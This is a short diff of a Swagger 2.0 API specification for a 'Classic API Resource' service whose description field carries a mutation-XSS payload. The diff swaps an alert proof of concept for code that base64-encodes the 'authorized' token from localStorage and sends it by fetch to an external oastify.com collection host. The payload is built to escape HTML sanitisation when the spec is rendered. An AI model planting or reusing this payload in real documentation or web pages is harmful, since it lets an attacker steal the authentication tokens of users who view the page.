@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(localStorage.getItem('authorized')) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror='fetch(\"https://77cjj6b0ggsxbjirvsgqqitct3zunlf94.oastify.com>?token=\"+btoa(localStorage.getItem(\"authorized\")));'></form>
 
   version: production
 basePath: /JSSResource/
